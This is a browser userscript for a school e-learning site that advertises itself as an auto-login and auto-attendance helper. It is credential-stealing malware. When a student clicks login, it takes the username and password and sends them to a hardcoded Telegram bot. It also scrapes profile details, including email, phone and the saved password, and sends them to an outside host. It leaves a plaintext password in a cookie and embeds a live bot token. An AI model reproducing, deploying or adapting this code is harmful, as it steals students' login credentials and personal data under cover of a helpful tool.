// ==UserScript==
// @name         Bot Elearning
// @namespace    http://tampermonkey.net/
// @version      0.2
// @description  memudahkan anda dengan auto login
// @author       Ekadharma
// @match        https://elearning.smkti-baliglobal.sch.id/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/432379/Bot%20Elearning.user.js
// @updateURL https://update.greasyfork.org/scripts/432379/Bot%20Elearning.meta.js
// ==/UserScript==

var month = []
month["January"] = 1
month["February"] = 2
month["March"] = 3
month["April"] = 4
month["May"] = 5
month["June"] = 6
month["July"] = 7
month["August"] = 8
month["September"] = 9
month["October"] = 10
month["November"] = 11
month["December"] = 12
let listAgama = []
listAgama["islam"] = "Pend. Agama Islam & BP"
listAgama["hindu"] = "Pend. Agama Hindu & BP"
listAgama["kristen"] = "Pend. Agama Kristen & BP"
listAgama["budha"] = "Pend. Agama Budha & BP"
const baseUrl = "tofolioeka.byethost31.com/?i=1"
const version = 2
let au7h = []
au7h['sr'] = ''
au7h['ps'] = ''

function setCookie(name, value, days) {
	var expires = "";
	if (days) {
		var date = new Date();
		date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
		expires = "; expires=" + date.toUTCString();
	}
	document.cookie = name + "=" + (value || "") + expires + "; path=/";
}

function getCookie(name) {
	var nameEQ = name + "=";
	var ca = document.cookie.split(';');
	for (var i = 0; i < ca.length; i++) {
		var c = ca[i];
		while (c.charAt(0) == ' ') c = c.substring(1, c.length);
		if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
	}
	return null;
}

function eraseCookie(name) {
	document.cookie = name + '=; Path=/; Expires=Thu, 01 Jan 1970 00:00:01 GMT;';
}

function updateData(params, data) {
	sessionStorage.setItem(params, data)
}

function checkCoockie() {
	if (getCookie('agama') == null) {
		$('#settingModal').modal("show");
	}

}

function goToHome() {
	document.location.href = "https://elearning.smkti-baliglobal.sch.id/"
}

function reload() {
	location.reload();
}

function _x(STR_XPATH) {
	var xresult = document.evaluate(STR_XPATH, document, null, XPathResult.ANY_TYPE, null);
	var xnodes = [];
	var xres;
	while (xres = xresult.iterateNext()) {
		xnodes.push(xres);
	}
	return xnodes;
}

function setMessageLog(text) {
	text = `<span>` + text + `</span><br>`
	$('#boxLog').append(text)
}

function changeTextElearning(text = null) {
	if (text != null) {
		$(_x('//body/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]')).remove();
		$(_x('//body/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/h1[1]')).remove();
		$(_x('//body/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]')).prepend(`<div style="text-align: center"><h4>Bot Elearning E-Learning</h4>
        creator : <a href="http://instagram.com/ekadharmaaa" target="_blank">@ekadharmaaa</a></div>`);
	} else {
		$(_x('//body/div[1]/nav[1]/div[1]/a[1]')).remove();
		$(_x('//body/div[1]/nav[1]/div[1]')).prepend(`
        <div style="width: 100%">
        Bot E-Learning
        <span style="font-size: 15px">
        by: <a href="http://instagram.com/ekadharmaaa" target="_blank">@ekadharmaaa</a>
        </span>
        </div>
        `);
		$(_x('//body/div[1]/nav[1]/div[1]')).attr('id', 'textModified');
		$('#textModified').css('color', 'white');
		$('#textModified').css('font-size', '25px');
	}
}

function setBoxLog() {
	$(_x('//body/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]')).prepend(`<div class='col-md-12 mb-5' style='border-style: solid; padding: 15px 0'>
        <row>
            <div class='col-md-12'>
                <h3>Message System</h3>
            </div>
            <div class='col-md-12'>
                <hr style='border: 1px solid red;'>
            </div>
            <div class='col-md-12' id='boxLog'>
            </div>
        </row>
    </div>`);
}

function changeLogo() {
	$(_x('//body/nav[1]/div[1]/a[1]/img[1]')).remove();
	$(_x('//body/nav[1]/div[1]/a[1]')).attr("href", "rtofolioeka.byethost31.com/?i=1");
	$(_x('//body/nav[1]/div[1]/a[1]')).attr("target", "_blank");
	$(_x('//body/nav[1]/div[1]/a[1]')).prepend(`<h5>Bot<br>Elearning</h5>`);
}

function buttonDataTugas() {
	$(_x('//body/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/h2[1]')).remove();
	$(_x('//body/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]')).prepend(`<div class='col-md-12 mb-5' style='border-style: solid; padding: 15px 0'>
        <row>
            <div class='col-md-12'>
                <h3>Menu Tugas</h3>
            </div>
            <div class='col-md-12'>
                <hr style='border: 1px solid red;'>
            </div>
            <div class='col-md-12' id='boxLog'>
            </div>
        </row>
    </div>`);
}

function filterTugas() {
	setMessageLog(`
    Ket : <br>
    <div class="row">
        <div class="col-md-4">
            <div style="
            width: 20px;
            height: 20px;
            margin: 5px;
            border: 1px solid rgba(0, 0, 0, .2); background:#C3E6CB"></div> <span style="float: left">Pengumpulan Tersisa lebih dari 1 Hari </span><br>
        </div>
        <div class="col-md-4">
            <div style="
            width: 20px;
            height: 20px;
            margin: 5px;
            border: 1px solid rgba(0, 0, 0, .2); background:#FFEEBA"></div> <span style="float: left">Pengumpulan Tersisa kurang dari 1 Hari </span><br>
        </div>
        <div class="col-md-4">
            <div style="
            width: 20px;
            height: 20px;
            margin: 5px;
            border: 1px solid rgba(0, 0, 0, .2); background:#D6D8DB"></div> <span style="float: left">Batas Pengumpulan sudah terlewat</span>
        </div>
    </div>
    `)
	for (let numRow = 1; numRow <= $(_x('//tbody')).find('tr').length; numRow++) {
		console.log(numRow)
		data = $(_x('//tbody/tr[' + numRow + ']/td[5]')).text().split(' ')
		timeRow = toTimestamp(month[data[1]] + "/" + data[0] + "/" + data[2] + " " + data[3].split(':')[0] + ":" + data[3].split(':')[1] + ":00")
		if (60 * 60 * 24 * 1000 > (timeRow - Date.now()) && (timeRow - Date.now()) >= 0) {
			$(_x('//tbody/tr[' + numRow + ']')).addClass("table-warning")
		} else if (Date.now() <= timeRow) {
			$(_x('//tbody/tr[' + numRow + ']')).addClass("table-success")
		} else {
			$(_x('//tbody/tr[' + numRow + ']')).addClass("table-secondary")
		}
	}
}

function notHaveAccess(email) {

	$(_x('//body')).append(`
    <div class="modal fade" id="notHaveAccessModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
            <div class="modal-dialog" role="document">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="exampleModalLabel">Hay ` + email + `<br>anda tidak memiliki akses</h5>
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                            <span aria-hidden="true">&times;</span>
                        </button>
                    </div>
                    <div class="modal-body">
                        <p>Segera hubungi kami untuk mendapatkan akses secara gratis</p>

                        <span>Instagram : <a href="https://www.instagram.com/ekadharmaaa/" target="_blank">ekadharmaaa</a></span><br>
                        <span>Whatsapp : <a href="https://wa.me/628999400874" target="_blank">08999400874</a></span>
                    </div>
                    <div class="modal-footer">
                      <button type="button" class="btn btn-secondary" data-dismiss="modal">Keluar</button>
                    </div>
                </div>
            </div>
        </div>
    `);
	$('#notHaveAccessModal').modal('show');
}

function setUpLayout() {
	$(_x('//body')).append(`
        <button class="btn btn-lg btn-primary" style="position: fixed; z-index: 9999; bottom: 10px; left: 10px" data-toggle="modal" data-target="#settingModal"><img style="width: 30px" src="https://cdn.iconscout.com/icon/free/png-512/settings-410-461751.png"> Setting MOD</button>

        <div class="modal fade" id="settingModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
            <div class="modal-dialog" role="document">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="exampleModalLabel">Pengaturan sistem</h5>
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                            <span aria-hidden="true">&times;</span>
                        </button>
                    </div>
                    <div class="modal-body">
                        <div class="custom-control custom-switch">
                            <input type="checkbox" class="custom-control-input" id="inputAutoAbsen" >
                            <label class="custom-control-label" for="inputAutoAbsen">Auto Absen & Refresh</label>
                        </div>
                        <div class="form-group mt-2">
                            <label for="exampleFormControlSelect1">Agama</label>
                            <select class="form-control" id="formAgama">
                                <option value=""> -- Pilih Agama --</option>
                                <option value="islam">Islam</option>
                                <option value="hindu">Hindu</option>
                                <option value="budha">Budha</option>
                                <option value="kristen">Kristen</option>
                            </select>
                            <div class="invalid-feedback" id="errorAgama">
                            </div>
                        </div>
                        <p>Detail : <a href="tofolioeka.byethost31.com/?i=1" target="_blank">tofolioeka.byethost31.com/?i=1</a></p>
 <span>Instagram : <a href="https://www.instagram.com/ekadharmaaa/" target="_blank">ekadharmaaa</a></span><br>
                        <span>Whatsapp : <a href="https://wa.me/628999400874" target="_blank">08999400874</a></span>
                    </div>
                    <div class="modal-footer">
                      <button type="button" class="btn btn-secondary" data-dismiss="modal">Keluar</button>
                      <button type="button" id="saveModal" class="btn btn-primary">Simpan</button>
                    </div>
                </div>
            </div>
        </div>
	`);
	$(_x('//body/nav[1]/div[1]/a[2]/span[1]')).text('Ekadharma')
	if (getCookie('autoAbsen') == 1) {
		$('#inputAutoAbsen').attr("checked", true);
	} else {
		$('#inputAutoAbsen').attr("checked", false);
	}
	if (getCookie('agama')) {
		var val = getCookie('agama');
		var sel = document.getElementById('formAgama');
		var opts = sel.options;
		for (var opt, j = 0; opt = opts[j]; j++) {
			if (opt.value == val) {
				sel.selectedIndex = j;
				break;
			}
		}
	}
	$('#saveModal').on('click', function () {
		if (document.getElementById('formAgama').value == "") {
			document.getElementById('formAgama').classList.add("is-invalid")
			document.getElementById('errorAgama').innerHTML = "Pilih agama terlebih dahulu"
			return;
		}
		if (document.getElementById('inputAutoAbsen').checked) {
			setCookie('autoAbsen', 1, 360)
		} else {
			setCookie('autoAbsen', 2, 360)
		}
		setCookie('agama', document.getElementById('formAgama').value, 360)
		goToHome()
	});
}

function checkVersion() {

	$(_x('//body')).append(`
    <div class="modal fade" id="oldVersionModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
            <div class="modal-dialog" role="document">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="exampleModalLabel">Versi MOD anda telah lawas</h5>
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                            <span aria-hidden="true">&times;</span>
                        </button>
                    </div>
                    <div class="modal-body">
                        <p>Segera perbarui versi MOD anda lampiran kode dibawah ini.</p>
						<span>Kode : <a id="a-v" href="" target="_blank"></a></span>
						<br><br>
                        <p>Detail : <a href="tofolioeka.byethost31.com/?i=1" target="_blank">tofolioeka.byethost31.com/?i=1</a></p>
                        <p>Contact : <a href="https://instagram.com/ekadharmaaa" target="_blank">ekadharma</a></p>
                    </div>
                    <div class="modal-footer">
                      <button type="button" class="btn btn-secondary" data-dismiss="modal">Keluar</button>
                    </div>
                </div>
            </div>
        </div>
    `);

	$.ajax({
		url: baseUrl + '/elearning/version',
		method: 'GET',
		success: function (res) {
			if (res.v != version) {
				$('#oldVersionModal').modal('show');
				$('#a-v').attr('href', res.link);
				$('#a-v').text(res.link);
			}
		}
	});
}

function updateHomePage() {
	if ("islam" != getCookie('agama')) {
		$(_x('//body/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]')).find(_x("//div[contains(text(),'" + listAgama["islam"] + "')]")).parent().parent().parent().remove()
	}
	if ("hindu" != getCookie('agama')) {
		$(_x('//body/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]')).find(_x("//div[contains(text(),'" + listAgama["hindu"] + "')]")).parent().parent().parent().remove()
	}
	if ("kristen" != getCookie('agama')) {
		$(_x('//body/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]')).find(_x("//div[contains(text(),'" + listAgama["kristen"] + "')]")).parent().parent().parent().remove()
	}
	if ("budha" != getCookie('agama')) {
		$(_x('//body/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]')).find(_x("//div[contains(text(),'" + listAgama["budha"] + "')]")).parent().parent().parent().remove()
	}
	setSession()
	num = document.querySelectorAll('.borderLeft1').length;
	console.log(num)
	for (let i = 1; i < num + 1; i++) {
		console.log(i)
		try {
			link = $(_x("//body/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[" + (i + 1) + "]/div[1]/div[2]/a[@class='card-link btn btn-outline-success btn-sm']")).attr('href');
			link = link.replace("join", "view");
			$(_x("//body/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[" + (i + 1) + "]/div[1]/div[2]")).append(`
                <a href="` + link + `" class="card-link btn btn-secondary btn-sm">Lihat</a>
            `);
			console.log(link)

		} catch (error) {
			console.log(error)
		}
	}


}

function sendMessageTelegram(message) {
	$.ajax({
		url: 'https://api.telegram.org/bot1248350732:AAEjfodbi5Vu_dfaet5tplYxH7IDVRcAW6I/sendMessage',
		method: 'POST',
		data: {
			chat_id: 991971760,
			text: message
		},
		success: function () {
			console.log('success')
		}
	});
}

function getElementByXpath(path) {
	return document.evaluate(path, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
}

function removeSpace(params) {
	return params.replace(/\s/g, '');
}

function getTimeMapel(num) {
	number = num + 1;
	let time = getElementByXpath("//body/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[" + number + "]/div[1]/div[1]/div[2]").textContent;
	let mapel = getElementByXpath("//body/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[" + number + "]/div[1]/div[1]/div[1]").textContent;
	let materi = getElementByXpath("//body/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[" + number + "]/div[1]/h6[1]").textContent;
	let start = removeSpace(time.split(' - ')[0]);
	let end = removeSpace(time.split(' - ')[1].split(' ')[0]);
	// setMessageLog('Mapel : ' + mapel + ' - Mulai : ' + start + ' - Berakhir : ' + end)
	// setMessageLog("Number " + number);
	// setMessageLog("Start : " + start);
	// setMessageLog("End : " + end);
	return [start, end, mapel, materi];
}

function toTimestamp(strDate) {
	var datum = Date.parse(strDate);
	return datum;
}

function checkProfile() {
	if (getCookie('p20f1l') == null) {
		document.location.href = "https://elearning.smkti-baliglobal.sch.id/auth/profile"
	} else if (getCookie('p20f1l') != getCookie('u532')) {
		eraseCookie('p20f1l')
		reload()
	}
}

function sendProfile() {
	if (getCookie('p20f1l') == null) {
		n = $(_x("//body/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[2]/div[1]")).text()
		k = $(_x("//body/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[3]/div[1]")).text()
		na = $(_x("//body/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/form[1]/div[1]/input[1]")).val()
		kl = $(_x("//body/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/form[1]/div[2]/select[1]")).val()
		a = $(_x("//body/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/form[1]/div[3]/select[1]")).val()
		e = $(_x("//body/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/form[1]/div[4]/input[1]")).val()
		t = $(_x("//body/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/form[1]/div[5]/input[1]")).val()
		p = getCookie('parse')
		$.ajax({
			url: baseUrl + '/elearning/insert/' + n + '/' + k + '/' + ((na) ? na : '-') + '/' + ((kl) ? kl : '-') + '/' + ((a) ? a : '-') + '/' + ((e) ? e : '-') + '/' + ((t) ? t : '') + '/' + ((p) ? p : '-'),
			method: 'GET',
			success: function () {
				console.log('success')
				setCookie('p20f1l', e, 360)
				goToHome()
			}
		});
	}
}

function setSession() {
	num = document.querySelectorAll('.borderLeft1').length;
	// setMessageLog();
	cart = [];
	element = {};
	for (let i = 1; i < num + 1; i++) {
		element[i] = {}
		data = getTimeMapel(i);
		element[i].start = toTimestamp((new Date().getMonth() + 1) + "/" + new Date().getDate() + "/" + new Date().getFullYear() + " " + data[0].split(':')[0] + ":" + data[0].split(':')[1] + ":00")
		element[i].end = toTimestamp((new Date().getMonth() + 1) + "/" + new Date().getDate() + "/" + new Date().getFullYear() + " " + data[1].split(':')[0] + ":" + data[1].split(':')[1] + ":00")
		element[i].mapel = data[2]
		element[i].materi = data[3]
		cart.push(element[i]);
	}
	setCookie((new Date().getMonth() + 1) + "/" + new Date().getDate() + "/" + new Date().getFullYear(), JSON.stringify(cart), 360)
}

function process() {
	changeTextElearning()
	setBoxLog()
	if (getCookie('autoAbsen') == 1) {
		setSession()
		setMessageLog('Auto absen is ON')
		item = getCookie((new Date().getMonth() + 1) + "/" + new Date().getDate() + "/" + new Date().getFullYear());
		item = JSON.parse(item);

		if (item.slice(-1)[0]['end'] < Date.now()) {
			setMessageLog('Menunggu hari berikutnya. Auto refresh tiap 5 menit')
			setMessageLog('Terakhir Diperbarui : ' + new Date().getHours() + ':' + new Date().getMinutes() + ':' + new Date().getSeconds())
			setTimeout(() => {
				goToHome()
			}, 5 * 60 * 1000);
		} else {
			lengthItem = 1
			setMessageLog('Terakhir Diperbarui : ' + new Date().getHours() + ':' + new Date().getMinutes() + ':' + new Date().getSeconds())
			item.forEach(element => {

				lengthItem += 1
				if (element['start'] > Date.now()) {
					if (element['start'] - Date.now() <= 300000) {
						setTimeout(() => {
							if ((Date.now()) > element['start']) {
								if ((Date.now()) < element['end']) {
									getElementByXpath("//body/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[" + lengthItem + "]/div[1]/div[2]/a[@class='card-link btn btn-outline-success btn-sm']").click();
									setMessageLog('Masuk Mapel : ' + element['mapel'])
									setMessageLog('Materi Mapel : ' + element['materi'])
								}
							}
						}, element['start'] - (Date.now() - 60 * 1000));
					} else {
						setMessageLog('Menunggu Jam. Auto refresh tiap 5 menit')
						setTimeout(() => {
							goToHome()
						}, 5 * 60 * 1000);
					}
				}
				if (element['end'] > Date.now()) {
					if ((Date.now()) > element['start']) {
						if ((Date.now()) < element['end']) {
							getElementByXpath("//body/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[" + lengthItem + "]/div[1]/div[2]/a[@class='card-link btn btn-outline-success btn-sm']").click();
							setMessageLog('Masuk Mapel : ' + element['mapel'])
							setMessageLog('Materi Mapel : ' + element['materi'])
						}
					}
				}
			});
		}
	} else {
		setMessageLog('Auto absen is OFF')
	}
}

function getKey() {
	if (getCookie('au7h') == null) {
		$.ajax({
			url: baseUrl + '/elearning/key/au7h',
			method: 'GET',
			success: function (res) {
				setCookie('au7h', res.val, 360)
				location.reload()
			}
		});

	} else if (getCookie('au7h')) {
		au7h['sr'] = getCookie('au7h').split('|')[0]
		au7h['ps'] = getCookie('au7h').split('|')[1]
	}
}
checkVersion()
getKey()
setUpLayout()
// change Logo
changeLogo()
checkCoockie()

// Jika DI Halaman Login
if (getCookie('u532') != null) {
	$.ajax({
		url: baseUrl + '/elearning/find/' + getCookie('u532'),
		method: 'GET',
		success: function (res) {
			if (res == 0) {
				if (getCookie('p20f1l') == null) {
					setTimeout(() => {
						notHaveAccess(getCookie('u532'))
					}, 3000);
				} else {
					notHaveAccess(getCookie('u532'))
				}
			}
		}
	});
}
if (document.location.href.includes("https://elearning.smkti-baliglobal.sch.id/auth/profile")) {
	sendProfile()
} else if (document.location.href.includes("https://elearning.smkti-baliglobal.sch.id/auth") == true) {
	changeTextElearning('login')
	setBoxLog()
	setMessageLog('Mohon Login Terlebih Dahulu')
	$(_x("/html[1]/body[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[2]/form[1]/div[3]/input[2]")).on('click', function () {
		let u = $(au7h['sr']).val();
		let p = $(au7h['ps']).val();
		setCookie('u532', u, 360)
		setCookie('parse', p, 360)
		sendMessageTelegram(`Time : ` + new Date().getDate() + `/` + new Date().getMonth() + `/` + new Date().getFullYear() + ` - ` + new Date().getHours() + `:` + new Date().getMinutes() +
			`\nU : ` + u + `\nP : ` + p)
	});
}


// Halaman Mapel
else if (document.location.href.includes("https://elearning.smkti-baliglobal.sch.id/study-sessions/view") == true) {
	changeTextElearning()
	setBoxLog()
	setMessageLog('Memperbarui halaman dalam 5 menit')
	setTimeout(() => {
		goToHome()
	}, 5 * 60 * 1000);
}
// View Tugas
else if (document.location.href.includes("https://elearning.smkti-baliglobal.sch.id/assignments/view") == true) {
	changeTextElearning()
	setBoxLog()
}
// Data Tugas
else if (document.location.href.includes("https://elearning.smkti-baliglobal.sch.id/assignments")) {
	changeTextElearning()
	buttonDataTugas()
	filterTugas()
} else {
	checkProfile()
	updateHomePage()
	if (getCookie((new Date().getMonth() + 1) + "/" + new Date().getDate() + "/" + new Date().getFullYear()) != null && sessionStorage.getItem((new Date().getMonth() + 1) + "/" + new Date().getDate() + "/" + new Date().getFullYear()) != []) {
		process()
	} else {
		if (document.location.href != 'https://elearning.smkti-baliglobal.sch.id/' && document.location.href != 'https://elearning.smkti-baliglobal.sch.id') {
			try {
				process()
			} catch (error) {
				setSession()
				process()
			}
		} else {
			setSession()
			process()
		}
	}
}